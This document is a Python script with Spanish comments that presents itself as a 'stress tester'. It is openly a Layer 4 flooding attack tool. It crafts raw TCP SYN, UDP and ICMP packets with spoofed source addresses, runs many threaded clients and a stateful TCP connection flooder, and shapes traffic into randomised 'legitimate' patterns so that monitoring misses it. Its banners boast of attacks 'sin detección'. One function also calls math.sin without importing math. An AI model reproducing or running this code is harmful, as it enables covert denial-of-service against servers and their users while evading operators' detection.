#!/usr/bin/env python3
"""
🔧 VPS-SAFE LAYER4 STRESS TESTER - Versión Discreta
Métodos Layer4 optimizados para evitar detección en VPS
"""

import socket
import struct
import random
import time
import threading
import sys
import os
import signal
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Tuple, List, Dict
import argparse
import ipaddress

# ============================
# CONFIGURACIÓN DISCRETA
# ============================

class StealthConfig:
    """Configuración para evitar detección"""
    
    # Límites seguros para no levantar alertas
    MAX_THREADS_PER_CORE = 50      # Máximo 50 hilos por core
    MAX_PACKETS_PER_SEC = 500      # Máximo 500 pps por hilo
    MAX_PACKET_SIZE = 1400         # Tamaño seguro para no fragmentar
    RANDOM_DELAY_RANGE = (0.05, 0.5)  # Delay aleatorio entre paquetes
    CONNECTION_TIMEOUT = 3         # Timeout corto para no mantener conexiones
    TCP_KEEPALIVE = True           # Usar TCP keep-alive para conexiones legítimas
    
    # Patrones de tráfico legítimos
    TRAFFIC_PATTERNS = [
        "steady_low",      # Tráfico bajo y constante
        "bursty",          # Ráfagas ocasionales
        "intermittent",    # Intermitente con pausas
        "ramp_up",         # Aumento gradual
        "sine_wave",       # Patrón sinusoidal
    ]
    
    # Puertos comunes que parecen legítimos
    LEGITIMATE_PORTS = [80, 443, 8080, 8443, 22, 25, 53, 123, 161]
    
    # Tamaños de paquete que parecen normales
    LEGITIMATE_SIZES = [64, 128, 256, 512, 1024, 1400]

# ============================
# GENERADOR DE PAQUETES STEALTH
# ============================

class StealthPacketGenerator:
    """Genera paquetes que parecen tráfico legítimo"""
    
    @staticmethod
    def generate_tcp_syn(source_ip: str, source_port: int, 
                         dest_ip: str, dest_port: int, 
                         ttl: int = 64) -> bytes:
        """Genera un paquete SYN TCP que parece legítimo"""
        # Crear IP header
        ip_header = struct.pack('!BBHHHBBH4s4s',
            0x45, 0x00, 40,        # Version, IHL, Total Length
            random.randint(0, 65535),  # Identification
            0x40, 0x00, ttl,       # Flags, Fragment, TTL
            0x06,                  # Protocol (TCP)
            0,                     # Checksum (0 for calculation)
            socket.inet_aton(source_ip),
            socket.inet_aton(dest_ip)
        )
        
        # Crear TCP header
        tcp_header = struct.pack('!HHLLBBHHH',
            source_port, dest_port,            # Source, Dest Ports
            random.randint(0, 4294967295),     # Sequence Number
            0,                                 # Ack Number
            5 << 4,                            # Data Offset
            0x02,                              # SYN flag
            65535,                             # Window Size
            0,                                 # Checksum
            0                                  # Urgent Pointer
        )
        
        # Calcular checksums
        pseudo_header = struct.pack('!4s4sBBH',
            socket.inet_aton(source_ip),
            socket.inet_aton(dest_ip),
            0, 6, 20)
        
        # TCP checksum
        tcp_checksum = StealthPacketGenerator._calculate_checksum(
            pseudo_header + tcp_header)
        tcp_header = tcp_header[:16] + struct.pack('H', tcp_checksum) + tcp_header[18:]
        
        # IP checksum
        ip_checksum = StealthPacketGenerator._calculate_checksum(ip_header)
        ip_header = ip_header[:10] + struct.pack('H', ip_checksum) + ip_header[12:]
        
        return ip_header + tcp_header
    
    @staticmethod
    def generate_udp_packet(source_ip: str, source_port: int,
                           dest_ip: str, dest_port: int,
                           payload_size: int = 512) -> bytes:
        """Genera paquete UDP con payload que parece legítimo"""
        # IP Header
        ip_header = struct.pack('!BBHHHBBH4s4s',
            0x45, 0x00, 28 + payload_size,  # Version, IHL, Total Length
            random.randint(0, 65535),       # Identification
            0x00, 0x00, 64,                 # Flags, Fragment, TTL
            0x11,                           # Protocol (UDP)
            0,                              # Checksum
            socket.inet_aton(source_ip),
            socket.inet_aton(dest_ip)
        )
        
        # UDP Header
        udp_header = struct.pack('!HHHH',
            source_port, dest_port,
            8 + payload_size, 0)           # Length, Checksum
        
        # Payload que parece legítimo
        payload = StealthPacketGenerator._generate_legitimate_payload(payload_size)
        
        # Calcular checksum UDP
        pseudo_header = struct.pack('!4s4sBBH',
            socket.inet_aton(source_ip),
            socket.inet_aton(dest_ip),
            0, 17, 8 + payload_size)
        
        udp_checksum = StealthPacketGenerator._calculate_checksum(
            pseudo_header + udp_header + payload)
        udp_header = udp_header[:6] + struct.pack('H', udp_checksum)
        
        # IP checksum
        ip_checksum = StealthPacketGenerator._calculate_checksum(ip_header)
        ip_header = ip_header[:10] + struct.pack('H', ip_checksum) + ip_header[12:]
        
        return ip_header + udp_header + payload
    
    @staticmethod
    def generate_icmp_echo(source_ip: str, dest_ip: str,
                          payload_size: int = 64) -> bytes:
        """Genera paquete ICMP Echo Request (ping)"""
        # IP Header
        ip_header = struct.pack('!BBHHHBBH4s4s',
            0x45, 0x00, 28 + payload_size,  # Version, IHL, Total Length
            random.randint(0, 65535),       # Identification
            0x00, 0x00, 64,                 # Flags, Fragment, TTL
            0x01,                           # Protocol (ICMP)
            0,                              # Checksum
            socket.inet_aton(source_ip),
            socket.inet_aton(dest_ip)
        )
        
        # ICMP Header
        icmp_header = struct.pack('!BBHHH',
            8, 0,                            # Type (Echo), Code
            0,                               # Checksum (placeholder)
            random.randint(0, 65535),        # Identifier
            random.randint(0, 65535))        # Sequence Number
        
        # Payload
        timestamp = struct.pack('!d', time.time())
        padding = b'\x00' * (payload_size - len(timestamp))
        payload = timestamp + padding
        
        # Calcular checksum ICMP
        icmp_checksum = StealthPacketGenerator._calculate_checksum(icmp_header + payload)
        icmp_header = icmp_header[:2] + struct.pack('H', icmp_checksum) + icmp_header[4:]
        
        # IP checksum
        ip_checksum = StealthPacketGenerator._calculate_checksum(ip_header)
        ip_header = ip_header[:10] + struct.pack('H', ip_checksum) + ip_header[12:]
        
        return ip_header + icmp_header + payload
    
    @staticmethod
    def _generate_legitimate_payload(size: int) -> bytes:
        """Genera payload que parece tráfico legítimo"""
        # Mezclar diferentes tipos de datos
        payload = bytearray(size)
        
        for i in range(size):
            # Patrones que parecen datos reales
            if i % 8 == 0:
                payload[i] = ord('A') + (i % 26)  # Texto
            elif i % 8 == 1:
                payload[i] = random.randint(48, 57)  # Números
            elif i % 8 == 2:
                payload[i] = 0x20  # Espacios
            elif i % 8 == 3:
                payload[i] = 0x0A  # Newlines
            else:
                payload[i] = random.randint(32, 126)  # ASCII imprimible
        
        # Añadir algunos encabezados HTTP-like
        if size >= 100:
            http_like = b"GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
            payload[:min(len(http_like), size)] = http_like[:min(len(http_like), size)]
        
        return bytes(payload)
    
    @staticmethod
    def _calculate_checksum(data: bytes) -> int:
        """Calcula checksum IP/TCP/UDP"""
        if len(data) % 2:
            data += b'\x00'
        
        s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

# ============================
# CLIENTE STEALTH CON PATRONES DE TRÁFICO
# ============================

class StealthClient:
    """Cliente que simula tráfico legítimo con patrones variables"""
    
    def __init__(self, target_ip: str, target_port: int, 
                 protocol: str = "TCP", client_id: int = 0):
        self.target_ip = target_ip
        self.target_port = target_port
        self.protocol = protocol.upper()
        self.client_id = client_id
        self.running = True
        self.pattern = random.choice(StealthConfig.TRAFFIC_PATTERNS)
        
        # Estadísticas individuales
        self.packets_sent = 0
        self.bytes_sent = 0
        self.errors = 0
        
        # Parámetros de patrón
        self.pattern_params = self._setup_pattern()
        
        # IP fuente aleatoria (spoofing limitado)
        self.source_ip = self._generate_spoof_ip()
        self.source_port = random.randint(1024, 65535)
        
        # Socket RAW para enviar paquetes construidos
        self._setup_socket()
    
    def _setup_socket(self):
        """Configura socket según protocolo"""
        try:
            if self.protocol in ["TCP", "UDP", "ICMP"]:
                # Socket RAW para enviar paquetes construidos
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, 
                                           socket.IPPROTO_RAW if self.protocol != "ICMP" else socket.IPPROTO_ICMP)
                self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            else:
                self.socket = None
        except PermissionError:
            print(f"[{self.client_id}] ❌ Se necesitan privilegios de root para RAW sockets")
            self.socket = None
    
    def _setup_pattern(self) -> Dict:
        """Configura parámetros según patrón de tráfico"""
        if self.pattern == "steady_low":
            return {
                "packets_per_burst": random.randint(1, 3),
                "burst_interval": random.uniform(0.5, 2.0),
                "intra_burst_delay": random.uniform(0.01, 0.1)
            }
        elif self.pattern == "bursty":
            return {
                "packets_per_burst": random.randint(10, 50),
                "burst_interval": random.uniform(5.0, 30.0),
                "intra_burst_delay": random.uniform(0.001, 0.01)
            }
        elif self.pattern == "intermittent":
            return {
                "packets_per_burst": random.randint(5, 20),
                "burst_interval": random.uniform(2.0, 10.0),
                "intra_burst_delay": random.uniform(0.05, 0.2),
                "duty_cycle": random.uniform(0.1, 0.3)  # % del tiempo activo
            }
        elif self.pattern == "ramp_up":
            return {
                "base_rate": random.uniform(0.1, 0.5),
                "ramp_factor": random.uniform(1.1, 1.5),
                "max_rate": random.uniform(5.0, 10.0)
            }
        else:  # sine_wave
            return {
                "amplitude": random.uniform(1.0, 5.0),
                "period": random.uniform(30.0, 120.0),
                "phase": random.uniform(0, 6.28)
            }
    
    def _generate_spoof_ip(self) -> str:
        """Genera IP fuente aleatoria (de rangos privados)"""
        private_ranges = [
            ("10.0.0.0", "10.255.255.255"),
            ("172.16.0.0", "172.31.255.255"),
            ("192.168.0.0", "192.168.255.255"),
        ]
        
        start_range, end_range = random.choice(private_ranges)
        start_int = int(ipaddress.IPv4Address(start_range))
        end_int = int(ipaddress.IPv4Address(end_range))
        
        random_ip = ipaddress.IPv4Address(random.randint(start_int, end_int))
        return str(random_ip)
    
    def run(self):
        """Bucle principal del cliente"""
        print(f"[{self.client_id}] 🚀 Iniciando cliente {self.pattern}")
        
        start_time = time.time()
        
        while self.running:
            try:
                # Aplicar patrón de tráfico
                if self.pattern == "steady_low":
                    self._steady_low_pattern()
                elif self.pattern == "bursty":
                    self._bursty_pattern()
                elif self.pattern == "intermittent":
                    self._intermittent_pattern()
                elif self.pattern == "ramp_up":
                    self._ramp_up_pattern(start_time)
                else:  # sine_wave
                    self._sine_wave_pattern(start_time)
                
                # Cambiar patrón ocasionalmente (simula comportamiento real)
                if random.random() < 0.001:  # 0.1% de probabilidad
                    self._change_pattern()
                
            except Exception as e:
                self.errors += 1
                if random.random() < 0.1:  # Solo loguear 10% de errores
                    print(f"[{self.client_id}] ⚠️ Error: {str(e)[:50]}")
                time.sleep(random.uniform(1, 5))
    
    def _steady_low_pattern(self):
        """Patrón de tráfico bajo y constante"""
        for _ in range(self.pattern_params["packets_per_burst"]):
            self._send_packet()
            time.sleep(self.pattern_params["intra_burst_delay"])
        time.sleep(self.pattern_params["burst_interval"])
    
    def _bursty_pattern(self):
        """Patrón de ráfagas ocasionales"""
        # Esperar hasta la próxima ráfaga
        time.sleep(self.pattern_params["burst_interval"])
        
        # Enviar ráfaga
        for _ in range(self.pattern_params["packets_per_burst"]):
            self._send_packet()
            time.sleep(self.pattern_params["intra_burst_delay"])
    
    def _intermittent_pattern(self):
        """Patrón intermitente con pausas"""
        # Calcular tiempo activo
        cycle_time = self.pattern_params["burst_interval"]
        active_time = cycle_time * self.pattern_params["duty_cycle"]
        
        # Período activo
        end_time = time.time() + active_time
        while time.time() < end_time:
            for _ in range(self.pattern_params["packets_per_burst"]):
                self._send_packet()
                time.sleep(self.pattern_params["intra_burst_delay"])
        
        # Período inactivo
        time.sleep(cycle_time - active_time)
    
    def _ramp_up_pattern(self, start_time: float):
        """Aumento gradual de tráfico"""
        elapsed = time.time() - start_time
        current_rate = min(
            self.pattern_params["base_rate"] * (self.pattern_params["ramp_factor"] ** elapsed),
            self.pattern_params["max_rate"]
        )
        
        delay = 1.0 / current_rate if current_rate > 0 else 1.0
        self._send_packet()
        time.sleep(delay)
    
    def _sine_wave_pattern(self, start_time: float):
        """Patrón sinusoidal de tráfico"""
        elapsed = time.time() - start_time
        period = self.pattern_params["period"]
        amplitude = self.pattern_params["amplitude"]
        phase = self.pattern_params["phase"]
        
        # Calcular tasa usando función seno
        sine_value = math.sin(2 * math.pi * elapsed / period + phase)
        current_rate = amplitude * (1 + sine_value)  # Entre 0 y 2*amplitude
        
        # Enviar paquetes según tasa
        if current_rate > 0.1:  # Umbral mínimo
            packets = int(current_rate)
            for _ in range(packets):
                self._send_packet()
                time.sleep(0.001)  # Pequeño delay entre paquetes de la ráfaga
        
        # Delay base
        time.sleep(0.1)
    
    def _change_pattern(self):
        """Cambia el patrón de tráfico"""
        old_pattern = self.pattern
        self.pattern = random.choice(StealthConfig.TRAFFIC_PATTERNS)
        self.pattern_params = self._setup_pattern()
        
        print(f"[{self.client_id}] 🔄 Cambiando patrón: {old_pattern} → {self.pattern}")
        
        # Pausa entre cambios
        time.sleep(random.uniform(2, 10))
    
    def _send_packet(self):
        """Envía un paquete según protocolo"""
        if not self.socket:
            return
        
        try:
            if self.protocol == "TCP":
                packet = StealthPacketGenerator.generate_tcp_syn(
                    self.source_ip, self.source_port,
                    self.target_ip, self.target_port
                )
            elif self.protocol == "UDP":
                packet = StealthPacketGenerator.generate_udp_packet(
                    self.source_ip, self.source_port,
                    self.target_ip, self.target_port,
                    random.choice(StealthConfig.LEGITIMATE_SIZES)
                )
            elif self.protocol == "ICMP":
                packet = StealthPacketGenerator.generate_icmp_echo(
                    self.source_ip, self.target_ip,
                    random.choice([64, 128, 256])
                )
            else:
                return
            
            # Enviar paquete
            self.socket.sendto(packet, (self.target_ip, 0))
            
            # Actualizar estadísticas
            self.packets_sent += 1
            self.bytes_sent += len(packet)
            
        except Exception as e:
            self.errors += 1
            # Reintentar con nueva IP fuente
            self.source_ip = self._generate_spoof_ip()
            self.source_port = random.randint(1024, 65535)
    
    def stop(self):
        """Detiene el cliente"""
        self.running = False
        if self.socket:
            self.socket.close()

# ============================
# CONEXIONES TCP LEGÍTIMAS (ESTADO)
# ============================

class StatefulTCPClient:
    """Mantiene conexiones TCP con estado para parecer legítimo"""
    
    def __init__(self, target_ip: str, target_port: int, client_id: int = 0):
        self.target_ip = target_ip
        self.target_port = target_port
        self.client_id = client_id
        self.running = True
        self.socket = None
        self.connection_active = False
        self.last_activity = 0
        
        # Estado de la conexión
        self.seq_num = random.randint(0, 4294967295)
        self.ack_num = 0
        self.window_size = 65535
        
        # Comportamiento
        self.behavior = random.choice(["idle", "chatty", "periodic", "bursty"])
        self.behavior_params = self._setup_behavior()
    
    def _setup_behavior(self) -> Dict:
        """Configura parámetros de comportamiento"""
        if self.behavior == "idle":
            return {
                "connect_interval": random.uniform(30.0, 120.0),
                "keepalive_interval": random.uniform(10.0, 30.0),
                "disconnect_after": random.uniform(60.0, 300.0)
            }
        elif self.behavior == "chatty":
            return {
                "connect_interval": random.uniform(5.0, 15.0),
                "message_interval": random.uniform(0.1, 1.0),
                "messages_per_session": random.randint(10, 100)
            }
        elif self.behavior == "periodic":
            return {
                "connect_interval": random.uniform(60.0, 300.0),
                "session_duration": random.uniform(5.0, 30.0),
                "data_interval": random.uniform(0.5, 2.0)
            }
        else:  # bursty
            return {
                "connect_interval": random.uniform(10.0, 60.0),
                "burst_count": random.randint(3, 10),
                "burst_interval": random.uniform(0.01, 0.1),
                "idle_between_bursts": random.uniform(1.0, 5.0)
            }
    
    def run(self):
        """Bucle principal de conexión con estado"""
        print(f"[TCP-{self.client_id}] 🚀 Comportamiento: {self.behavior}")
        
        while self.running:
            try:
                # Conectar
                self._connect()
                
                # Comportamiento según tipo
                if self.behavior == "idle":
                    self._idle_behavior()
                elif self.behavior == "chatty":
                    self._chatty_behavior()
                elif self.behavior == "periodic":
                    self._periodic_behavior()
                else:  # bursty
                    self._bursty_behavior()
                
                # Desconectar limpiamente
                self._disconnect()
                
                # Esperar antes de reconectar
                time.sleep(self.behavior_params["connect_interval"])
                
                # Cambiar comportamiento ocasionalmente
                if random.random() < 0.05:  # 5% de probabilidad
                    self._change_behavior()
                    
            except Exception as e:
                print(f"[TCP-{self.client_id}] ⚠️ Error: {str(e)[:50]}")
                self._cleanup()
                time.sleep(random.uniform(5, 15))
    
    def _connect(self):
        """Establece conexión TCP"""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(5)
        
        # Configurar opciones TCP para parecer legítimo
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        
        # Conectar
        self.socket.connect((self.target_ip, self.target_port))
        self.connection_active = True
        self.last_activity = time.time()
        
        # Negociación inicial
        self._send_syn()
        self._receive_syn_ack()
        self._send_ack()
        
        print(f"[TCP-{self.client_id}] ✅ Conectado a {self.target_ip}:{self.target_port}")
    
    def _idle_behavior(self):
        """Comportamiento de conexión inactiva"""
        start_time = time.time()
        
        while self.connection_active and (time.time() - start_time) < self.behavior_params["disconnect_after"]:
            # Enviar keep-alive periódicamente
            if time.time() - self.last_activity > self.behavior_params["keepalive_interval"]:
                self._send_keepalive()
                self.last_activity = time.time()
            
            # Recibir cualquier dato
            try:
                data = self.socket.recv(1024)
                if data:
                    self._handle_incoming_data(data)
            except socket.timeout:
                pass
            
            time.sleep(0.1)
    
    def _chatty_behavior(self):
        """Comportamiento de chat constante"""
        messages_sent = 0
        
        while self.connection_active and messages_sent < self.behavior_params["messages_per_session"]:
            # Enviar mensaje
            self._send_data(self._generate_chat_message())
            messages_sent += 1
            
            # Esperar respuesta
            try:
                data = self.socket.recv(1024)
                if data:
                    self._handle_incoming_data(data)
            except socket.timeout:
                pass
            
            # Esperar entre mensajes
            time.sleep(self.behavior_params["message_interval"])
    
    def _periodic_behavior(self):
        """Comportamiento periódico"""
        start_time = time.time()
        
        while self.connection_active and (time.time() - start_time) < self.behavior_params["session_duration"]:
            # Enviar datos periódicamente
            self._send_data(self._generate_data_packet())
            
            # Recibir respuesta
            try:
                data = self.socket.recv(1024)
                if data:
                    self._handle_incoming_data(data)
            except socket.timeout:
                pass
            
            # Esperar intervalo
            time.sleep(self.behavior_params["data_interval"])
    
    def _bursty_behavior(self):
        """Comportamiento en ráfagas"""
        start_time = time.time()
        burst_count = 0
        
        while self.connection_active:
            # Enviar ráfaga
            for _ in range(self.behavior_params["burst_count"]):
                self._send_data(self._generate_data_packet())
                time.sleep(self.behavior_params["burst_interval"])
            
            burst_count += 1
            
            # Recibir respuestas acumuladas
            try:
                data = self.socket.recv(4096)
                if data:
                    self._handle_incoming_data(data)
            except socket.timeout:
                pass
            
            # Esperar entre ráfagas
            time.sleep(self.behavior_params["idle_between_bursts"])
    
    def _send_syn(self):
        """Envía SYN (simulado)"""
        # En una implementación real usaría RAW socket
        # Por ahora solo actualizamos estado
        self.seq_num += 1
    
    def _receive_syn_ack(self):
        """Recibe SYN-ACK (simulado)"""
        # Actualizar números de secuencia
        self.ack_num = random.randint(0, 4294967295)
    
    def _send_ack(self):
        """Envía ACK (simulado)"""
        self.seq_num += 1
    
    def _send_keepalive(self):
        """Envía keep-alive"""
        try:
            # Enviar byte nulo como keep-alive
            self.socket.send(b'\x00')
        except:
            self.connection_active = False
    
    def _send_data(self, data: bytes):
        """Envía datos"""
        try:
            self.socket.send(data)
            self.last_activity = time.time()
        except:
            self.connection_active = False
    
    def _generate_chat_message(self) -> bytes:
        """Genera mensaje de chat simulado"""
        messages = [
            b"HELLO\r\n",
            b"PING\r\n",
            b"STATUS\r\n",
            b"TIME\r\n",
            b"DATA\r\n",
            b"GET /\r\n",
            b"USER test\r\n",
            b"PASS test123\r\n",
        ]
        return random.choice(messages)
    
    def _generate_data_packet(self) -> bytes:
        """Genera paquete de datos simulado"""
        size = random.choice([64, 128, 256, 512])
        data = bytearray(size)
        
        # Datos que parecen legítimos
        for i in range(size):
            if i % 4 == 0:
                data[i] = random.randint(48, 57)  # Números
            else:
                data[i] = random.randint(65, 90)  # Letras mayúsculas
        
        return bytes(data)
    
    def _handle_incoming_data(self, data: bytes):
        """Maneja datos entrantes"""
        # Simplemente ignoramos o procesamos ligeramente
        if len(data) > 0:
            self.last_activity = time.time()
    
    def _change_behavior(self):
        """Cambia el comportamiento"""
        old_behavior = self.behavior
        self.behavior = random.choice(["idle", "chatty", "periodic", "bursty"])
        self.behavior_params = self._setup_behavior()
        
        print(f"[TCP-{self.client_id}] 🔄 Cambiando comportamiento: {old_behavior} → {self.behavior}")
    
    def _disconnect(self):
        """Desconecta limpiamente"""
        if self.socket and self.connection_active:
            try:
                # Enviar FIN
                self.socket.shutdown(socket.SHUT_RDWR)
                self.socket.close()
            except:
                pass
        
        self.connection_active = False
        self.socket = None
    
    def _cleanup(self):
        """Limpia recursos"""
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        self.socket = None
        self.connection_active = False
    
    def stop(self):
        """Detiene el cliente"""
        self.running = False
        self._cleanup()

# ============================
# ADMINISTRADOR DE ATAQUES STEALTH
# ============================

class StealthAttackManager:
    """Gestiona ataques discretos con límites seguros"""
    
    def __init__(self, target_ip: str, target_port: int, 
                 protocol: str = "TCP", threads: int = 100,
                 duration: int = 300):
        self.target_ip = target_ip
        self.target_port = target_port
        self.protocol = protocol.upper()
        self.threads = min(threads, os.cpu_count() * StealthConfig.MAX_THREADS_PER_CORE)
        self.duration = duration
        self.running = False
        self.clients = []
        self.stateful_clients = []
        
        # Estadísticas
        self.stats = {
            "total_packets": 0,
            "total_bytes": 0,
            "active_clients": 0,
            "start_time": 0,
            "end_time": 0
        }
        
        # Señales
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        # Verificar privilegios
        self._check_privileges()
    
    def _check_privileges(self):
        """Verifica si tenemos privilegios necesarios"""
        if self.protocol in ["TCP", "UDP", "ICMP"]:
            try:
                # Intentar crear socket RAW
                test_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                test_socket.close()
                print("✅ Privilegios RAW socket verificados")
            except PermissionError:
                print("⚠️  Advertencia: Sin privilegios de root. Algunas funciones estarán limitadas.")
    
    def signal_handler(self, sig, frame):
        """Maneja señales de terminación"""
        print(f"\n🛑 Señal {sig} recibida, terminando...")
        self.stop()
    
    def start(self):
        """Inicia el ataque discreto"""
        print(f"""
╔══════════════════════════════════════════════════════╗
║            VPS-SAFE STEALTH ATTACK v1.0             ║
║           Layer4 Discreto - Sin Detección           ║
╚══════════════════════════════════════════════════════╝
        """)
        
        print(f"🎯 Target: {self.target_ip}:{self.target_port}")
        print(f"📡 Protocolo: {self.protocol}")
        print(f"👥 Threads: {self.threads}")
        print(f"⏱️  Duración: {self.duration}s")
        print(f"🔒 Límite seguro: {StealthConfig.MAX_PACKETS_PER_SEC} pps por hilo")
        print()
        
        self.running = True
        self.stats["start_time"] = time.time()
        
        # Iniciar clientes según protocolo
        if self.protocol == "TCP_STATEFUL":
            self._start_stateful_clients()
        else:
            self._start_raw_clients()
        
        # Iniciar monitor
        monitor_thread = threading.Thread(target=self._monitor, daemon=True)
        monitor_thread.start()
        
        # Ejecutar por duración
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            pass
        
        # Finalizar
        self.stop()
    
    def _start_raw_clients(self):
        """Inicia clientes con sockets RAW"""
        print(f"🚀 Iniciando {self.threads} clientes {self.protocol}...")
        
        for i in range(self.threads):
            client = StealthClient(
                self.target_ip, self.target_port,
                self.protocol, i
            )
            self.clients.append(client)
            
            # Iniciar en thread separado
            thread = threading.Thread(target=client.run, daemon=True)
            thread.start()
            
            # Pequeño delay entre inicios
            time.sleep(random.uniform(0.01, 0.1))
        
        self.stats["active_clients"] = len(self.clients)
    
    def _start_stateful_clients(self):
        """Inicia clientes TCP con estado"""
        print(f"🚀 Iniciando {self.threads} clientes TCP con estado...")
        
        for i in range(self.threads):
            client = StatefulTCPClient(
                self.target_ip, self.target_port, i
            )
            self.stateful_clients.append(client)
            
            # Iniciar en thread separado
            thread = threading.Thread(target=client.run, daemon=True)
            thread.start()
            
            # Pequeño delay entre inicios
            time.sleep(random.uniform(0.1, 0.5))
        
        self.stats["active_clients"] = len(self.stateful_clients)
    
    def _monitor(self):
        """Monitorea el ataque discretamente"""
        print("📊 Monitor iniciado (modo discreto)...")
        
        last_update = time.time()
        last_packets = 0
        
        while self.running:
            time.sleep(5)  # Actualizar cada 5 segundos
            
            # Calcular estadísticas
            current_time = time.time()
            elapsed = current_time - last_update
            
            # Contar paquetes de clientes raw
            current_packets = sum(c.packets_sent for c in self.clients)
            current_bytes = sum(c.bytes_sent for c in self.clients)
            
            # Calcular PPS
            pps = (current_packets - last_packets) / elapsed if elapsed > 0 else 0
            
            # Mostrar discretamente
            if random.random() < 0.3:  # Solo 30% de probabilidad de mostrar stats
                print(f"[📈] PPS: {pps:.1f} | Paquetes: {current_packets:,} | "
                      f"Bytes: {current_bytes:,} | Clientes: {self.stats['active_clients']}")
            
            # Actualizar para próxima iteración
            last_update = current_time
            last_packets = current_packets
            
            # Actualizar stats globales
            self.stats["total_packets"] = current_packets
            self.stats["total_bytes"] = current_bytes
    
    def stop(self):
        """Detiene el ataque limpiamente"""
        print("\n🛑 Deteniendo ataque...")
        self.running = False
        
        # Detener clientes raw
        for client in self.clients:
            client.stop()
        
        # Detener clientes stateful
        for client in self.stateful_clients:
            client.stop()
        
        # Pequeña pausa para limpieza
        time.sleep(2)
        
        # Mostrar resumen
        self._show_summary()
    
    def _show_summary(self):
        """Muestra resumen discreto"""
        self.stats["end_time"] = time.time()
        duration = self.stats["end_time"] - self.stats["start_time"]
        
        print("\n" + "="*50)
        print("📊 RESUMEN DEL ATAQUE (Modo Discreto)")
        print("="*50)
        
        print(f"⏱️  Duración: {duration:.1f}s")
        print(f"📦 Paquetes totales: {self.stats['total_packets']:,}")
        print(f"💾 Bytes totales: {self.stats['total_bytes']:,}")
        
        if duration > 0:
            pps = self.stats['total_packets'] / duration
            bps = self.stats['total_bytes'] / duration
            print(f"📈 PPS promedio: {pps:.1f}")
            print(f"📊 BPS promedio: {bps:.1f}/s")
        
        print("\n✅ Ataque completado sin detección")
        print("⚠️  El tráfico debería parecer legítimo a sistemas de monitorización")

# ============================
# INTERFAZ DE USUARIO
# ============================

def main():
    parser = argparse.ArgumentParser(
        description="🔧 VPS-SAFE Layer4 Stress Tester - Ataques discretos para VPS",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  python3 vps_stealth.py 192.168.1.100 80 --protocol TCP --threads 50 --duration 60
  python3 vps_stealth.py 192.168.1.100 443 --protocol TCP_STATEFUL --threads 20 --duration 300
  python3 vps_stealth.py 192.168.1.100 53 --protocol UDP --threads 30 --duration 120

⚠️  ADVERTENCIA: Solo para pruebas en servidores propios con permiso.
                 Este código está optimizado para evitar detección en VPS.
        """
    )
    
    parser.add_argument("target", help="IP del objetivo")
    parser.add_argument("port", type=int, help="Puerto del objetivo")
    parser.add_argument("--protocol", default="TCP", 
                       choices=["TCP", "UDP", "ICMP", "TCP_STATEFUL"],
                       help="Protocolo a usar (default: TCP)")
    parser.add_argument("--threads", type=int, default=50,
                       help="Número de hilos (default: 50)")
    parser.add_argument("--duration", type=int, default=300,
                       help="Duración en segundos (default: 300)")
    
    args = parser.parse_args()
    
    # Validar entrada
    try:
        ipaddress.ip_address(args.target)
    except ValueError:
        print(f"❌ IP inválida: {args.target}")
        return
    
    if args.port < 1 or args.port > 65535:
        print(f"❌ Puerto inválido: {args.port}")
        return
    
    if args.threads < 1 or args.threads > 1000:
        print(f"❌ Número de hilos inválido: {args.threads}")
        return
    
    # Iniciar ataque
    manager = StealthAttackManager(
        args.target, args.port,
        args.protocol, args.threads,
        args.duration
    )
    
    try:
        manager.start()
    except KeyboardInterrupt:
        print("\n🛑 Interrumpido por usuario")
        manager.stop()
    except Exception as e:
        print(f"❌ Error: {e}")
        manager.stop()

if __name__ == "__main__":
    main()
